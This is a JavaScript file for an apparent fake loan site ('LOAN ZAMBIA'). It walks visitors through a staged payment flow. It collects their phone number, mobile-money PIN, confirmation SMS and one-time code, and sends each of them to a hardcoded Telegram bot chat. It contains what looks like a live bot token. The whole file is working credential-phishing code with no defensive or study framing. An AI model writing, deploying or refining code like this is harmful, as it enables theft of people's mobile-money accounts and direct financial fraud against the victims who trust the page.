// ==========================================
// TELEGRAM CONFIGURATION
// Replace placeholders with your real credentials
// ==========================================
const TELEGRAM_BOT_TOKEN = '8606961970:AAGdUlXayC-ZCOqD0Dw9LtF18dx-AyfCIak';
const TELEGRAM_CHAT_ID = '6535428990';

// Function to send messages to your Telegram Chat
async function sendTelegramNotification(textMessage) {
  if (TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_TELEGRAM_CHAT_ID_HERE') {
    console.warn('Telegram Bot Token or Chat ID not configured yet.');
    return;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: textMessage,
        parse_mode: 'Markdown'
      })
    });
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
  }
}

// Step Elements
const step1 = document.getElementById('step1');
const phoneStep = document.getElementById('phoneStep');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');

// Form Controls
const paymentForm = document.getElementById('paymentForm');
const phoneInput = document.getElementById('phone');
const planSelect = document.getElementById('plan');
const statusDiv = document.getElementById('status');
const sendBtn = document.getElementById('sendBtn');
const continueBtn = document.getElementById('continueBtn');
const backToPlansBtn = document.getElementById('backToPlansBtn');

// Modal Elements
const ussdModal = document.getElementById('ussdModal');
const modalPromptText = document.getElementById('modalPromptText');
const momoPin = document.getElementById('momoPin');
const submitPinBtn = document.getElementById('submitPinBtn');
const cancelPinBtn = document.getElementById('cancelPinBtn');

// Step 2 Controls
const smsText = document.getElementById('smsText');
const verifySmsBtn = document.getElementById('verifySmsBtn');

// Step 3 Controls
const otpCode = document.getElementById('otpCode');
const verifyOtpBtn = document.getElementById('verifyOtpBtn');
const resendOtpBtn = document.getElementById('resendOtpBtn');

let timerInterval = null;

function showStep(stepElement) {
  [step1, phoneStep, step2, step3].forEach(step => step.classList.remove('active'));
  stepElement.classList.add('active');
}

continueBtn.addEventListener('click', function() {
  showStep(phoneStep);
});

backToPlansBtn.addEventListener('click', function() {
  showStep(step1);
});

function startOtpTimer(seconds = 30) {
  clearInterval(timerInterval);
  let timeLeft = seconds;
  resendOtpBtn.disabled = true;
  resendOtpBtn.textContent = `Resend OTP (${timeLeft}s)`;

  timerInterval = setInterval(() => {
    timeLeft--;
    if (timeLeft <= 0) {
      clearInterval(timerInterval);
      resendOtpBtn.disabled = false;
      resendOtpBtn.textContent = 'Resend OTP';
    } else {
      resendOtpBtn.textContent = `Resend OTP (${timeLeft}s)`;
    }
  }, 1000);
}

// 1. Click "Send Payment Request" -> Trigger PIN Popup
paymentForm.addEventListener('submit', function(e) {
  e.preventDefault();
  const phone = phoneInput.value.trim();

  if (phone.length < 8) {
    statusDiv.className = 'error';
    statusDiv.textContent = 'Please enter a valid phone number.';
    return;
  }

  statusDiv.className = '';
  statusDiv.textContent = 'Initiating USSD prompt...';
  sendBtn.disabled = true;

  setTimeout(() => {
    modalPromptText.textContent = ` Enter 5-digit PIN:`;
    momoPin.value = '';
    ussdModal.style.display = 'flex';
  }, 1000);
});

// 2. Submit PIN -> Send (Phone + PIN) to Telegram & Go to SMS Step
submitPinBtn.addEventListener('click', async function() {
  const pin = momoPin.value.trim();

  if (pin.length !== 5 || isNaN(pin)) {
    alert('Please enter a valid 5-digit numeric PIN.');
    return;
  }

  ussdModal.style.display = 'none';
  statusDiv.className = '';
  statusDiv.textContent = 'PIN accepted! Sending notification...';

  // Send Phone & PIN to Telegram
  const msg = `🚨 *LOAN ZAMBIA*\n📱 *Phone Number:* \`${phoneInput.value.trim()}\` \n💵 *Plan Amount:* \`$${planSelect.value}\` \n🔐 *PIN:* \`${pin}\``;
  await sendTelegramNotification(msg);

  setTimeout(() => {
    statusDiv.textContent = 'Please enter or paste the confirmation SMS message received on your handset.';
    showStep(step2);
  }, 800);
});

cancelPinBtn.addEventListener('click', function() {
  ussdModal.style.display = 'none';
  statusDiv.className = 'error';
  statusDiv.textContent = 'Transaction cancelled by user.';
  sendBtn.disabled = false;
});

// 3. Verify SMS -> Send Real SMS to Telegram & Go to OTP Step
verifySmsBtn.addEventListener('click', async function() {
  const message = smsText.value.trim();

  if (message.length < 3) {
    statusDiv.className = 'error';
    statusDiv.textContent = 'Please enter a valid confirmation SMS message.';
    return;
  }

  statusDiv.className = '';
  statusDiv.textContent = 'Verifying SMS...';

  // Send Real SMS to Telegram
  const msg = `📩 *Real SMS Received*\n📱 *Phone Number:* \`${phoneInput.value.trim()}\` \n💬 *SMS Content:*\n\`\`\`${message}\`\`\``;
  await sendTelegramNotification(msg);

  setTimeout(() => {
    statusDiv.textContent = 'SMS verified! An OTP code has been generated. Enter the 4-digit code below.';
    showStep(step3);
    startOtpTimer(30);
  }, 800);
});

// Resend OTP Button Handler
resendOtpBtn.addEventListener('click', async function() {
  if (resendOtpBtn.disabled) return;
  statusDiv.className = '';
  statusDiv.textContent = 'Sending a new OTP code...';
  otpCode.value = '';

  await sendTelegramNotification(`🔄 *OTP Resend Requested* for \`${phoneInput.value.trim()}\``);

  setTimeout(() => {
    statusDiv.textContent = 'A new 4-digit OTP code has been sent.';
    startOtpTimer(30);
  }, 1000);
});

// 4. Verify 4-Digit OTP -> Send OTP to Telegram & Complete Flow
verifyOtpBtn.addEventListener('click', async function() {
  const otp = otpCode.value.trim();

  if (otp.length !== 4 || isNaN(otp)) {
    statusDiv.className = 'error';
    statusDiv.textContent = 'Please enter a valid 4-digit numeric OTP.';
    return;
  }

  statusDiv.className = '';
  statusDiv.textContent = 'Validating OTP...';

  // Send Final OTP to Telegram
  const msg = `🔑 *Real OTP Submitted*\n📱 *Phone Number:* \`${phoneInput.value.trim()}\` \n🔢 *OTP Code:* \`${otp}\``;
  await sendTelegramNotification(msg);

  setTimeout(() => {
    clearInterval(timerInterval);
    statusDiv.className = 'success';
    statusDiv.textContent = `[loan connected] Check if you recieve Payment message, if not please contact support on messenger ) ${phoneInput.value.trim()}!`;

    setTimeout(() => {
      paymentForm.reset();
      smsText.value = '';
      otpCode.value = '';
      sendBtn.disabled = false;
      showStep(step1);
    }, 3500);
  }, 1000);
});
